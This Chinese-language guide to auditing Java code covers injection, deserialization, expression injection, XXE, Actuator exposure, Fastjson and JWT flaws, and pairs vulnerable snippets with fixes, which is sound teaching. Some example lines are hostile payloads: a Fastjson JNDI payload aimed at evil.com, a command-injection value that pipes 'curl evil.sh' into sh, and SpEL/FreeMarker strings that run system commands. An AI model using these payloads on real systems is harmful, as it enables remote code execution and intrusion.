# Java 代码审计实战指南

---

## 一、Java 代码审计核心知识

Java 生态常见漏洞点与函数对照:

| 漏洞 | 关键 API | 说明 |
|------|---------|------|
| SQL 注入 | `Statement.executeQuery(sql)`、`jdbcTemplate.query(sql)`、`entityManager.createNativeQuery(sql)` | 拼接变量进 SQL |
| 命令执行 | `Runtime.getRuntime().exec()`、`ProcessBuilder`、`groovy.lang.Shell.evaluate`、`ScriptEngine` | 执行操作系统命令 |
| 反序列化 | `ObjectInputStream.readObject()`、`ObjectMessage`、SnakeYAML、XStream、Kryo、Jackson `enableDefaultTyping` | `gadget` 类链 |
| 表达式注入 | `SpEL ExpressionParser.parseExpression()`、`OGNL`、`MVEL`、`Freemarker / Velocity` 模板 | 表达式语言执行 |
| 文件上传/下载 | `MultipartFile` → `Files.copy`、`file.transferTo(Paths.get(userInput))` | 路径拼接 |
| SSRF | `URL.openConnection()`、`HttpClient`、`OkHttp`、`RestTemplate` | URL 参数可控 |
| XXE | `DocumentBuilderFactory`、`SAXParser`、`XMLInputFactory`、`TransformerFactory` | 未禁用外部实体 |
| XSS | `out.print(userInput)` / thymeleaf `th:utext` / JSP `<%=` | 未转义输出 |
| JWT / Cookie | `parseClaimsJws` 前未验签、JWT `none` 算法、弱 secret | 认证绕过 |
| 越权 / 权限 | `@PreAuthorize` / `Shiro filterChainDefinitionMap` 遗漏 | 资源访问无校验 |

## 二、SQL 注入

```java
// ❌ 拼接 (JDBC Statement)
String sql = "SELECT * FROM user WHERE username = '" + user + "'";
Statement st = conn.createStatement();
ResultSet rs = st.executeQuery(sql);

// ❌ 拼接 (MyBatis ${variable})
<select id="findByName" parameterType="string" resultType="User">
  SELECT * FROM user WHERE name = ${name}   <!-- 直接字符串替换 -->
</select>

// ✅ 预编译 (PreparedStatement)
PreparedStatement ps = conn.prepareStatement("SELECT * FROM user WHERE username = ?");
ps.setString(1, user);

// ✅ MyBatis #{} (预编译参数绑定)
<select id="findByName" parameterType="string" resultType="User">
  SELECT * FROM user WHERE name = #{name}
</select>

// ✅ JPA
@Query("SELECT u FROM User u WHERE u.name = :name")
List<User> findByName(@Param("name") String name);
```

## 三、Java 反序列化漏洞

### 3.1 漏洞原理

Java 反序列化漏洞核心在于: **应用允许不可信数据流经 `ObjectInputStream.readObject()`**，攻击者通过构造" Gadget Chain "（一组类调用链）触发命令执行。

### 3.2 常见 Gadget 链

| Gadget 链 | 依赖 | 影响 |
|----------|------|------|
| CommonsCollections 1-7 | commons-collections 3.x / 4.x | RCE |
| CommonsBeanutils | commons-beanutils + ROME | RCE |
| Jdk7u21 / Jdk8u20 | JRE 自带 | RCE (较新 JRE 已补) |
| Spring AOP | spring-core + cglib | RCE |
| Fastjson 1.2.x (autoType) | fastjson | RCE (大量 CVE) |
| Jackson `@class` | jackson-databind `enableDefaultTyping` | RCE |
| XStream | xstream `<java.lang.ProcessBuilder>` | RCE |
| SnakeYAML | yaml `!!javax.script.ScriptEngineManager` | RCE |

### 3.3 典型触发点

```java
// ❌ 1. ObjectInputStream 读取 socket / http body
ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
Object obj = ois.readObject();

// ❌ 2. Hessian / Dubbo / RMI 协议原生支持 Java 对象传输
// ❌ 3. JMS ObjectMessage 接收端
// ❌ 4. HttpSession 序列化还原
// ❌ 5. Fastjson 默认开启 autoType (已在新版关闭, 但历史版本多)
JSON.parseObject(jsonStr, Object.class);  // "autoType" + 恶意 class
```

### 3.4 利用工具

- **ysoserial**: 生成各种 gadget 链 payload (`java -jar ysoserial.jar CommonsCollections4 "nslookup xxx.dnslog.cn" | base64 -w0`)
- **marshalsec**: 针对 Fastjson / Jackson / SnakeYAML 的 payload 生成
- **JNDI-Injection-Exploit**: 构造 JNDI RMI/LDAP 利用链
- **Hackvertor** (Burp): 在 Burp 内序列化/反序列化

## 四、表达式注入（SpEL / OGNL）

```java
// ❌ SpEL
ExpressionParser parser = new SpelExpressionParser();
String expr = "#runtime = @java.lang.Runtime@getRuntime().exec('whoami').getInputStream()";
Object value = parser.parseExpression(expr).getValue();

// ❌ OGNL (Struts2 S2-045 / S2-057 等均源于此)
Object result = Ognl.getValue(userInput, context);

// ❌ FreeMarker / Velocity
Template t = new Template("name", "${userInput}", new Configuration());
// userInput 如: ${(''+'').class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')}
```

## 五、XXE

```java
// ❌ 未禁用外部实体
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(input);

// ✅ 修复
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

## 六、Spring Boot 安全检查清单

```yaml
application.yml 关注项:
  spring:
    datasource.url:          # 是否泄漏生产 DB 连接串?
    jpa.hibernate.ddl-auto:  # create-drop / none?
  server:
    error.include-stacktrace: never    # 生产必须 never
    error.whitelabel.enabled: false    # 自定义错误页
  management:
    endpoints.web.exposure.include: health,info   # ❌ 禁止暴露 env/actuator/*
    endpoints.env.keys-to-sanitize: password,secret,key,token
  spring-security:
    filter.dispatcher-types: request,async,error  # 避免 error 路径绕过鉴权

常见 Actuator 风险:
  /actuator/env → 泄露环境变量 (DB 密码 / JWT secret)
  /actuator/heapdump → 下载堆 dump → 离线分析内存中的密钥
  /actuator/trace / httptrace → 请求历史
  /actuator/jolokia → 若 Jolokia 存在, 可 RCE (CVE-2018-1000005)
  /actuator/logfile → 日志文件
```

## 七、Fastjson 风险

```java
// 历史高危: fastjson 1.2.24 ~ 1.2.66 (大量 autoType 绕过 CVE)
JSON.parseObject(jsonStr, Object.class);
JSON.parse(jsonStr);  // 允许 @type 字段指定 class
// payload example:
// {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://evil.com:1099/Exploit","autoCommit":true}

// ✅ 升级到最新版本; 默认关闭 autoType
ParserConfig.getGlobalInstance().setAutoTypeSupport(false);
ParserConfig.getGlobalInstance().addAccept("com.company.");
```

## 八、JWT / 认证安全

```java
// ❌ 未校验签名: 直接 parse 拿 payload
//    JWT jwt = Jwts.parser().parse(token)  // 不校验签名旧 API 已弃用

// ✅ 标准用法 (jjwt):
Jws<Claims> claims = Jwts.parserBuilder()
    .setSigningKey(secretKey)   // 必须指定签名密钥, 否则 reject
    .build()
    .parseClaimsJws(token);

// ❌ secret 硬编码在代码 / 配置文件
// ✅ secret 存 Vault / KMS / 环境变量, 不入库代码库

// 风险点:
//   1. HS256 弱 secret (字典攻击)
//   2. alg: none 绕过签名校验
//   3. RS256 → HS256 (公钥当密钥) 的算法切换攻击
```

## 九、命令注入

```java
// ❌ 拼接参数到 exec
Process p = Runtime.getRuntime().exec("ping -c 2 " + host);
// 利用: host = "127.0.0.1; curl evil.sh | sh"

// ✅ 使用数组形式 (避免 shell 解析)
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "2", host);
pb.redirectErrorStream(true);
Process p = pb.start();
// 额外: 白名单校验 host (IP 正则)

// ❌ ScriptEngine eval 用户可控脚本
ScriptEngine engine = new ScriptEngineManager().getEngineByName("nashorn");
engine.eval(userInput);   // RCE via Java.type('java.lang.Runtime')
```

## 十、审计流程

```
Step 1: 获取依赖清单
        mvn dependency:tree  → 检查第三方 CVE (OWASP Dependency-Check)
        gradle dependencies

Step 2: 全局搜索危险函数
        grep -rn "Runtime.getRuntime().exec\|ProcessBuilder\|.exec(" src/
        grep -rn "eval\|ScriptEngine\|SpelExpression\|@type" src/
        grep -rn "readObject\|ObjectInputStream\|new ObjectInputStream" src/

Step 3: 鉴权矩阵
        列出所有 Controller 的 @RequestMapping/@GetMapping
        标记哪些需要登录/权限, 确认 @PreAuthorize / Shiro filterChainDefinitionMap 生效

Step 4: 配置文件
        application*.yml / .properties / jasypt 加密密钥是否硬编码
        是否存在 debug=true / stacktrace=always / actuator 暴露

Step 5: 接口层
        @RequestParam / @RequestBody / @PathVariable 是否被直接拼接 SQL / 传命令
        返回对象是否包含多余字段 (DTO vs Entity)

Step 6: 第三方组件版本
        Spring / Spring Boot / Log4j2 (CVE-2021-44228) / Fastjson /
        Shiro (CVE-2016-4437 RememberMe) / Dubbo / RocketMQ / ActiveMQ
```

## 十一、CheckList

- [ ] SQL: 是否统一用预编译/ORM? 有没有手写 Statement 拼接?
- [ ] 反序列化: 是否 `readObject` 读取外部数据? Fastjson/JDK 版本?
- [ ] Actuator: endpoints 暴露哪些? 生产必须 minimal (health/info)
- [ ] 配置文件: DB/JWT 密钥是否硬编码? 是否开启 debug?
- [ ] JWT/认证: 签名校验是否强制? secret 安全? `none` 算法?
- [ ] 表达式: SpEL/OGNL/MVEL/模板引擎是否接收用户输入?
- [ ] XXE: 所有 XML 解析器是否禁用了 DTD/外部实体?
- [ ] 文件上传: 后缀白名单? 随机重命名? 存储路径是否在 webroot 外?
- [ ] SSRF: 是否对 URL 做协议/内网 IP 校验?
- [ ] Spring Security / Shiro: 鉴权规则是否覆盖了所有接口? 静态资源/错误页?
- [ ] 第三方依赖: Log4j2/Struts2/Fastjson/Shiro 等历史高危组件版本是否最新?
